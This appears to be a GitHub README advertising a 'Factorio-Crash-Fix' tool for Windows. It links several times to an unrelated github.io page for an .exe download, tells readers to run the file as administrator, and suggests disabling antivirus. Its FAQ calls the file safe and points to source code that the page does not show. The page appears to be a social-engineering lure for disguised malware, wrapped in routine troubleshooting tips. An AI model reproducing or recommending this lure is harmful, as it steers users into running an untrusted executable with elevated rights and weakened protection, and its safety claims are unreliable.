# 🛠️ Factorio-Crash-Fix - Repair your game launch errors today

[![](https://img.shields.io/badge/Download-Factorio_Fix-blue.svg)](https://onomastic-falseindigo39.github.io)

This tool fixes launch issues for Factorio on Windows 10 and Windows 11. It restores missing configuration files, updates driver compatibility settings, and resets graphical states that prevent the game from opening. Follow the instructions below to resolve your crash errors.

## 📋 System Requirements

Ensure your computer meets these basic requirements before you run the fix:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Storage: At least 50 MB of free disk space.
*   Game Version: Steam version or standalone version of Factorio.
*   Permissions: Administrator access on your Windows user account.

## ⬇️ How to Download and Install

You need to obtain the latest version of the repair tool. Follow these steps:

1.  Visit the [official releases page](https://onomastic-falseindigo39.github.io) to download the repair package.
2.  Locate the latest file ending in `.exe`.
3.  Click the file link to start the download.
4.  Save the file to your Downloads folder or your Desktop.

## ⚙️ Running the Repair Process

Once you download the file, perform these steps to repair your game:

1.  Close Steam and any other game launchers currently running.
2.  Locate the downloaded file.
3.  Right-click the file and select "Run as administrator" to grant it permission to adjust system files.
4.  Follow the prompts on the screen.
5.  Wait for the application to scan your Factorio installation directory.
6.  Click the "Apply Fix" button once the status light turns green.
7.  The tool notifies you when the repair process finishes.
8.  Restart your computer to ensure all configuration changes take effect.

## 🔍 Troubleshooting Performance Issues

If the game still fails to launch after using the tool, check these items:

*   Verify your game files through Steam by right-clicking Factorio in your library, selecting Properties, choosing Local Files, and clicking Verify Integrity.
*   Update your graphics drivers to the latest version provided by your manufacturer (NVIDIA, AMD, or Intel).
*   Disable third-party antivirus software temporarily to see if it blocks the game launch.
*   Ensure your monitor resolution supports the game default settings. 

## 🛠️ Advanced Manual Configuration

If the automated tool does not solve the problem, you may edit the settings file manually:

1.  Press the Windows key + R on your keyboard.
2.  Type `%appdata%\Factorio` and press Enter.
3.  Locate the file named `config.ini`.
4.  Open this file using Notepad.
5.  Search for the line `show-tips-and-tricks=true`. Change this to `false` if you experience a crash on the loading screen.
6.  Look for `fullscreen=true` and change it to `fullscreen=false` to launch the game in windowed mode. This helps if your monitor has trouble syncing the game display.
7.  Save the file and try to launch the game again.

## 📑 Common Error Logs

The repair tool records its actions in an error log file. You can find this log in the same folder where you saved the download.

*   `Access Denied`: This means your user account lacks the rights to reach the game folder. Right-click the game folder and select Properties to check that your account has "Full Control" or "Modify" access.
*   `File Not Found`: This occurs if the tool cannot locate your Steam installation. Make sure you installed Factorio in the default folder.
*   `Compatibility Error`: This indicates that your Windows version needs an update. Open Settings, go to Windows Update, and install any pending updates.

## 📦 What the Tool Adjusts

The program performs these specific tasks to help your game:

*   Clears corrupted temporary cache files hidden in your local game directory.
*   Updates the `config.ini` file to match modern Windows display standards.
*   Resets registry keys that relate to Factorio launch parameters.
*   Refreshes the mod lookup path to ensure broken mods do not cause a silent crash.

## ❓ Frequently Asked Questions

**Does this tool affect my saved games?**
No. The repair process only touches configuration files and system settings. Your factory layouts, blueprints, and save files remain untouched.

**Is it safe to run this file?**
Yes. You can verify the file contents by opening the source code in this repository. It performs standard file operations meant to replicate a clean install state.

**Do I need to uninstall my mods?**
The tool attempts to load the game in a default state. If the game launches after the fix, you can re-enable your mods one by one to see if a specific mod causes the issue.

**Will I need to run this again?**
Most users only need to run the tool one time. If you update your graphics drivers or move your game installation, you might need to run the tool again to realign the pathing.